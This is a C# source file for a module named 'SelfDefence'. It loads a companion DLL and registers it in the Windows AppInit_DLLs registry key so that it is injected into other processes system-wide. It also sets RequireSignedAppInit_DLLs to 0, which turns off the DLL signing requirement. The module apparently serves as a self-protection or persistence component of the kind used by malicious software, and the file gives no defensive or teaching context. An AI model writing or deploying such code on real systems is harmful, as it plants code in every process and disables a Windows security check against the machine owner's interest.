using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Module_SelfDefence
{
    public static class Module_SelfDefence
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);
        public static void Install_SelfDefence()
        {
            string self_defence_dll_name = "_s_Module_SelfDefence.dll";
            //load for current process
            LoadLibrary(self_defence_dll_name);
            //install to other process
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows");
            string self_defence_dll_full_Path = Directory.GetCurrentDirectory() + "\\" + self_defence_dll_name;
            string self_defence_dll_short_Path = GetShortPath(self_defence_dll_full_Path);
            key.SetValue("AppInit_DLLs", self_defence_dll_short_Path);
            key.SetValue("LoadAppInit_DLLs", 1);
            //disable signed dll need
            key.SetValue("RequireSignedAppInit_DLLs", 0);
            //close key
            key.Close();

        }

        const int MAX_PATH = 255;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName(
            [MarshalAs(UnmanagedType.LPTStr)]
         string path,
            [MarshalAs(UnmanagedType.LPTStr)]
         StringBuilder shortPath,
            int shortPathLength
            );

        private static string GetShortPath(string path)
        {
            var shortPath = new StringBuilder(MAX_PATH);
            GetShortPathName(path, shortPath, MAX_PATH);
            return shortPath.ToString();
        }
    }
}
